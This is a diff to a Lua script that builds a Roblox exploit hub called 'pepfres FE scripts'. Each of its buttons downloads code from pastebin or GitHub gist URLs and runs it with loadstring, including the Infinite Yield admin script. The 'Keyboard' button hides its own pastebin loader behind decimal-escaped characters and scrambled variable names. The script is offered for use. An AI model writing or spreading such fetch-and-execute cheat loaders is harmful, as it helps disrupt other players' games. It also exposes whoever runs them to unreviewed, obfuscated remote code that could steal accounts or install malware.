@@ -1,1 +1,84 @@
-loadstring("\112\114\105\110\116\40\34\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\98\77\57\74\77\113\110\39\41\41\40\41\34\41\10")()
+local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
+
+local Window = Library.CreateLib("pepfres FE scripts", "DarkTheme")
+
+local Tab = Window:NewTab("Scripts")
+
+local Section = Tab:NewSection("Scripts")
+
+Section:NewButton("Soul Reaper", "FE Soul Reaper", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/bQRebUUj'))()
+end)
+
+Section:NewButton("Sakura Blade", "FE Sakura Blade", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/zsvqh0VE'))()
+end)
+
+Section:NewButton("Void Boss", "FE Void Boss", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/WEifMP4Q'))()
+end)
+
+Section:NewButton("Surfer", "FE Surfer", function() loadstring(game:HttpGet('https://gist.githubusercontent.com/MoonDevRed/328253b738041e0503dd581ac108b705/raw/1d593587f8e2a895275e37530eb499920b2f2902/Fe%2520Surfboard%2520By%2520Red%2520Moon'))()
+end)
+
+Section:NewButton("Hat Orbit", "FE Hat Orbit", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/izdgRV6V"))()
+end)
+
+Section:NewButton("Lazer Arm", "FE Lazer Arm", function()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts-2/main/FE%20Laser%20Arm.Lua"))()
+end)
+
+Section:NewButton("Zombie", "FE Zombie", function()
+loadstring(game:HttpGet("https://gist.githubusercontent.com/someunknowndude/18f1d979ad9a25ad69064be75f55f735/raw/dc36f1e9ad906a7434bd77bcd0ce8218fb5f4d88/zombie.lua"))()
+end)
+
+Section:NewButton("Blind Reaper", "FE Blind Reaper", function()
+loadstring(game:HttpGet('https://pastebin.com/raw/3ECV5zch'))()
+end)
+
+Section:NewButton("Demo Knight", "FE Demo Knight", function()
+loadstring(game:HttpGet('https://pastebin.com/raw/B9CNNG5a'))()
+end)
+
+Section:NewButton("Scp 096", "FE Scp 096", function()
+loadstring(game:HttpGet('https://pastebin.com/raw/P0q5PQRp'))()
+end)
+
+Section:NewButton("Studio Dummy", "FE Studio Dummy", function()
+loadstring(game:HttpGet('https://pastebin.com/raw/bvF12uw0'))()
+end)
+
+Section:NewButton("Ban Hammer", "FE Ban Hammer", function()
+loadstring(game:HttpGet('https://pastebin.com/raw/tHuSPru3'))()
+end)
+
+Section:NewButton("Dio Gloves", "FE Dio Gloves",function()
+loadstring(game:HttpGet('https://pastebin.com/raw/BiXEtZ8M'))()
+end)
+
+Section:NewButton("Ravager Hands", "FE Ravager Hands",function()
+loadstring(game:HttpGet('https://pastebin.com/raw/E4ckPJwZ'))()
+end)
+
+Section:NewButton("NepV", "FE NepV",function()
+loadstring(game:HttpGet('https://pastebin.com/raw/GKbJ8657'))()
+end)
+
+Section:NewButton("Madox Cannon", "FE Madox Cannon",function()
+loadstring(game:HttpGet('https://pastebin.com/raw/zYFSSzqt'))()
+end)
+
+Section:NewButton("Ruin EX", "FE Ruin EX",function()
+loadstring(game:HttpGet('https://pastebin.com/raw/zS6MvNPT'))() 
+end)
+
+local Tab = Window:NewTab("Others")
+
+local Section = Tab:NewSection("Other Scripts")
+
+Section:NewButton("Keyboard", "FE Keyboard", function() SGTSOBF_wwwwwWwWw={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\112","\97","\115","\116","\101","\98","\105","\110","\46","\99","\111","\109","\47","\114","\97","\119","\47","\117","\85","\81","\105","\54","\57","\49","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_RRRrRrrRR="";for _,SGTSOBF_lLLLLllll in pairs(SGTSOBF_wwwwwWwWw)do SGTSOBF_RRRrRrrRR=SGTSOBF_RRRrRrrRR..SGTSOBF_lLLLLllll;end;SGTSOBF_gGGGggggG=function(SGTSOBF_lLllLlLLL)loadstring(SGTSOBF_lLllLlLLL)()end;SGTSOBF_gGGGggggG(SGTSOBF_RRRrRrrRR)
+end)
+
+Section:NewButton("Infinite Yield", "Infinite Yield", function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
